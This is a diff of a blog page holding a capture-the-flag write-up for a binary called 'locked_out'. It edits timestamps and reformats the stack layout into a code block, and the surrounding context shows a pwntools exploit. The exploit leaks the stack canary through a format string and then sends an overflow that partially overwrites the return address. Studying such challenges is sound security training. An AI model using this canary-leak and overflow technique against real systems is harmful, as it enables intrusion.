@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://junseopark0216.github.io/images/2026-08-24-03-38-19.png">
 <meta property="og:image" content="https://junseopark0216.github.io/images/2026-08-24-03-40-14.png">
 <meta property="article:published_time" content="2026-08-22T15:00:00.000Z">
-<meta property="article:modified_time" content="2026-08-23T20:08:31.414Z">
+<meta property="article:modified_time" content="2026-08-23T20:12:18.136Z">
 <meta property="article:author" content="Zune">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://junseopark0216.github.io/images/2026-08-24-03-39-08.png">
@@ -221,7 +221,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-08-24 05:08:31" itemprop="dateModified" datetime="2026-08-24T05:08:31+09:00">2026-08-24</time>
+      <time title="Modified: 2026-08-24 05:12:18" itemprop="dateModified" datetime="2026-08-24T05:12:18+09:00">2026-08-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -286,8 +286,8 @@
 <p>Sending the overflow payload also overwrites <code>v3</code> (the attempt counter). If <code>v3</code> becomes a large value like <code>0x41414141</code>, the loop never ends and <code>ret</code> is never reached.</p>
 <p>Solution: place <code>p32(1)</code> at the <code>v3</code> position. This makes <code>--v3 = 0</code>, causing <code>while(0 &gt; 0)</code> to evaluate as false and the loop exits naturally.</p>
 <p><strong>Stack Layout</strong><br><img src="/images/2026-08-24-03-38-19.png"></p>
-<p>[rbp-0x14] s (8 bytes) ← buffer start<br>[rbp-0x0C] v3 (4 bytes) ← attempt counter<br>[rbp-0x08] canary (8 bytes)<br>[rbp+0x00] saved rbp<br>[rbp+0x08] return address</p>
-<p>Final payload structure:<br>[A*8] [p32(1)] [canary] [p64(0)] [0xda]<br>s     v3&#x3D;1     canary   saved_rbp  ret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[rbp-0x14] s (8 bytes) ← buffer start</span><br><span class="line">[rbp-0x0C] v3 (4 bytes) ← attempt counter</span><br><span class="line">[rbp-0x08] canary (8 bytes)</span><br><span class="line">[rbp+0x00] saved rbp</span><br><span class="line">[rbp+0x08] return address</span><br><span class="line"></span><br><span class="line">Final payload structure:</span><br><span class="line">[A*8] [p32(1)] [canary] [p64(0)] [0xda]</span><br><span class="line">s     v3=1     canary   saved_rbp  ret</span><br></pre></td></tr></table></figure>
+
 <hr>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./locked_out&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Canary leak</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;PIN: &quot;</span>, <span class="string">b&quot;%9$p&quot;</span>)</span><br><span class="line">line = p.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(line.split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Overflow</span></span><br><span class="line"><span class="comment"># s(8) + v3=1(4) + canary(8) + saved_rbp(8) + lowest 1 byte of ret</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> + p32(<span class="number">1</span>) + p64(canary) + p64(<span class="number">0</span>) + p8(<span class="number">0xda</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;PIN: &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/images/2026-08-24-03-40-14.png"></p>
